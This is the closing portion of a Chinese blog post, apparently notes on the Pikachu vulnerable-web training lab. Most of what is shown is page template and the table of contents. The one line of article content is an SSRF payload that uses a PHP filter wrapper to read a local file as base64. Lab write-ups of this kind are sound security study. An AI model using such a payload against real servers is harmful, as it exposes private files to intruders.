+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=D:/a.txt</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/fac52ef62e274aa49b4bc8e7eb36df6f" alt="SSRF1"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://atdunbg.xyz">Atdunbg</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://atdunbg.xyz/2023/08/10/Pikachu_practice/">https://atdunbg.xyz/2023/08/10/Pikachu_practice/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://atdunbg.xyz" target="_blank">Atdunbg</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a></div><div class="post_share"><div class="social-share" data-image="http://rz9ih6j96.hn-bkt.clouddn.com/pikachu_practice.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/05/18/cloud_linux_5/" title="云计算--Linux 集群原理(笔记5)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://rz9ih6j96.hn-bkt.clouddn.com/cloudLinux.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">云计算--Linux 集群原理(笔记5)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/03/27/archinstall/" title="记一次ArchLinux的安装过程"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://rz9ih6j96.hn-bkt.clouddn.com/archLinux.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-27</div><div class="title">记一次ArchLinux的安装过程</div></div></a></div><div><a href="/2022/12/20/c_language_10/" title="C语言(第十章--对文件的输出)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-20</div><div class="title">C语言(第十章--对文件的输出)</div></div></a></div><div><a href="/2022/11/22/c_language_6/" title="C语言(第六章-利用数组批量处理数据)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-22</div><div class="title">C语言(第六章-利用数组批量处理数据)</div></div></a></div><div><a href="/2022/11/23/c_language_7/" title="C语言(第七章--函数)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-23</div><div class="title">C语言(第七章--函数)</div></div></a></div><div><a href="/2022/12/01/c_language_8/" title="C语言(第八章-善于利用指针)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-01</div><div class="title">C语言(第八章-善于利用指针)</div></div></a></div><div><a href="/2023/02/01/c-language-1/" title="C语言(1~5章(补))"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-01</div><div class="title">C语言(1~5章(补))</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avater.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Atdunbg</div><div class="author-info__description">没啥好描述的</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/atdunbg"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/atdunbg" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:979541498@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"></div><div id="welcome-info"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pikachu%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-text">Pikachu练习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Pikachu%E9%9D%B6%E5%9C%BA"><span class="toc-text">0x01 Pikachu靶场</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">0x02 暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">基于表单的暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88on-server%EF%BC%89"><span class="toc-text">验证码绕过（on server）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88on-client%EF%BC%89"><span class="toc-text">验证码绕过（on client）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E9%98%B2%E7%88%86%E7%A0%B4%EF%BC%9F"><span class="toc-text">Token防爆破？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Cross-Site-Scripting"><span class="toc-text">0x03 Cross-Site Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%EF%BC%88get%EF%BC%89"><span class="toc-text">反射型xss（get）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%EF%BC%88post%EF%BC%89"><span class="toc-text">反射型xss（post）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-text">DOM型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8Bxss-x"><span class="toc-text">DOM型xss-x</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="toc-text">xss之盲打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-text">xss之过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bhtmlspecialchars"><span class="toc-text">xss之htmlspecialchars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="toc-text">xss之href输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="toc-text">xss之js输出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-CSRF"><span class="toc-text">0x04 CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-get"><span class="toc-text">CSRF(get)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-post"><span class="toc-text">CSRF(post)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-token"><span class="toc-text">CSRF(token)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Sql-Inject"><span class="toc-text">0x05 Sql Inject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">搜索型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">xx型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%9Cinsert-update%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="toc-text">“insert&#x2F;update”注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%9Cdelete%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="toc-text">“delete”注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%9Chttp-header%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="toc-text">“http header”注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%88base-on-boolean%EF%BC%89"><span class="toc-text">盲注（base on boolean）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%88base-on-time%EF%BC%89"><span class="toc-text">盲注（base on time）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-RCE"><span class="toc-text">0x06 RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exec%E2%80%9Dping%E2%80%9D"><span class="toc-text">exec”ping”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exec%E2%80%9Deval%E2%80%9D"><span class="toc-text">exec”eval”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-File-Inclusion"><span class="toc-text">0x07 File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-inclusion-local"><span class="toc-text">file inclusion(local)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-inclusion-remote"><span class="toc-text">file inclusion(remote)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-Unsafe-file-download"><span class="toc-text">0x08 Unsafe file download</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe-file-download"><span class="toc-text">Unsafe file download</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-unsafe-upfileupload"><span class="toc-text">0x09 [unsafe upfileupload]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#client-check"><span class="toc-text">client check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME-type"><span class="toc-text">MIME type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getimagesize"><span class="toc-text">getimagesize()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-over-permission"><span class="toc-text">0x10 over permission</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-text">水平越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-text">垂直越权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">0x11 ..&#x2F;..&#x2F;(目录遍历)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">目录遍历</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">0x12 敏感信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#icanyourABC"><span class="toc-text">icanyourABC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">0x13 php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">php反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-XXE"><span class="toc-text">0x14 XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="toc-text">XXE漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-URL%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-text">0x15 URL重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84url%E8%B7%B3%E8%BD%AC"><span class="toc-text">不安全的url跳转</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16-SSRF"><span class="toc-text">0x16 SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-curl"><span class="toc-text">SSRF(curl)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-file-get-content"><span class="toc-text">SSRF(file_get_content)</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/10/Pikachu_practice/" title="Pikachu练习记录"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://rz9ih6j96.hn-bkt.clouddn.com/pikachu_practice.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu练习记录"/></a><div class="content"><a class="title" href="/2023/08/10/Pikachu_practice/" title="Pikachu练习记录">Pikachu练习记录</a><time datetime="2023-08-10T07:06:10.000Z" title="发表于 2023-08-10 15:06:10">2023-08-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/18/cloud_linux_5/" title="云计算--Linux 集群原理(笔记5)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://rz9ih6j96.hn-bkt.clouddn.com/cloudLinux.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算--Linux 集群原理(笔记5)"/></a><div class="content"><a class="title" href="/2023/05/18/cloud_linux_5/" title="云计算--Linux 集群原理(笔记5)">云计算--Linux 集群原理(笔记5)</a><time datetime="2023-05-18T04:56:07.000Z" title="发表于 2023-05-18 12:56:07">2023-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/27/cloud_linux_4/" title="云计算--Linux 开源虚拟化KVM(笔记4)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://rz9ih6j96.hn-bkt.clouddn.com/cloudLinux.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算--Linux 开源虚拟化KVM(笔记4)"/></a><div class="content"><a class="title" href="/2023/04/27/cloud_linux_4/" title="云计算--Linux 开源虚拟化KVM(笔记4)">云计算--Linux 开源虚拟化KVM(笔记4)</a><time datetime="2023-04-27T04:56:07.000Z" title="发表于 2023-04-27 12:56:07">2023-04-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/19/cloud_linux_3/" title="云计算--Linux 服务与安全(笔记3)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://rz9ih6j96.hn-bkt.clouddn.com/cloudLinux.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算--Linux 服务与安全(笔记3)"/></a><div class="content"><a class="title" href="/2023/04/19/cloud_linux_3/" title="云计算--Linux 服务与安全(笔记3)">云计算--Linux 服务与安全(笔记3)</a><time datetime="2023-04-19T02:30:07.000Z" title="发表于 2023-04-19 10:30:07">2023-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/27/archinstall/" title="记一次ArchLinux的安装过程"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://rz9ih6j96.hn-bkt.clouddn.com/archLinux.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次ArchLinux的安装过程"/></a><div class="content"><a class="title" href="/2023/03/27/archinstall/" title="记一次ArchLinux的安装过程">记一次ArchLinux的安装过程</a><time datetime="2023-03-27T02:30:08.000Z" title="发表于 2023-03-27 10:30:08">2023-03-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Atdunbg</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button class="share" type="button" title="右键模式" onclick="changeMouseMode()"><i class="fas fa-mouse"></i></button><button type="button" title="切换背景" onclick="toggleWinbox()"><i class="fas fa-display"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i><span id="percent">0<span>%</span></span></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" href="javascript:rmf.scrollToTop();"><i class="fa fa-arrow-up"></i></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>复制</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.baidu.com/s?wd=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa fa-search"></i><span>百度搜索</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>转到链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>粘贴</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fas fa-comment"></i><span>空降评论</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>复制本文地址</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>新窗口打开</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>转到链接</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>保存图片</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>在新窗口打开</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制图片链接</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:switchNightMode();"><i class="fa fa-moon"></i><span>昼夜切换</span></a><a class="rightMenu-item" href="/about/"><i class="fa fa-info-circle"></i><span>关于博客</span></a><a class="rightMenu-item" href="javascript:toggleWinbox();"><i class="fas fa-cog"></i><span>美化设置</span></a><a class="rightMenu-item" href="javascript:rmf.fullScreen();"><i class="fas fa-expand"></i><span>切换全屏</span></a><a class="rightMenu-item" href="javascript:window.print();"><i class="fa-solid fa-print"></i><span>打印页面</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaidWrap.length) {
+    window.runMermaid = () => {
+      window.loadMermaid = true
+      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+      Array.from($mermaidWrap).forEach((item, index) => {
+        const mermaidSrc = item.firstElementChild
+        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+        const mermaidID = 'mermaid-' + index
+        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
+        })
+      })
+    }
+
+    const loadMermaid = () => {
+      window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+    }
+
+    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '1MfOjJuDKfEx8tmbhFKUEr4I-gzGzoHsz',
+      appKey: 'Dgp2DWfdohOSLaIYc0dBdRud',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, {"enableQQ":true,"placeholder":"昵称框输入QQ号试试～"}))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="https://cdn.jsdelivr.net/gh/nextapps-de/winbox/dist/winbox.bundle.min.js"></script><script async src="https://cdn1.tianli0.top/npm/vue@2.6.14/dist/vue.min.js"></script><script async src="https://cdn1.tianli0.top/npm/element-ui@2.15.6/lib/index.js"></script><script src="/js/sun_moon.js" async></script><div class="aplayer no-destroy" data-id="7708342577" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="false"> </div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script defer type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script defer src="/js/lunar.js"></script><script defer src="/js/day.js"></script><script async src="/js/title.js"></script><script type="text/javascript" src="https://cdn1.tianli0.top/npm/jquery@latest/dist/jquery.min.js"></script><script type="text/javascript" src="/js/rightmenu.js"></script><script async src="/js/fps.js"></script><script defer src="https://cdn1.tianli0.top/gh/nextapps-de/winbox/dist/winbox.bundle.min.js"></script><script defer data-pjax src="/js/meihua.js"></script><script src="https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js"></script><script async data-pjax src="/js/announce.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/airconditioner/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
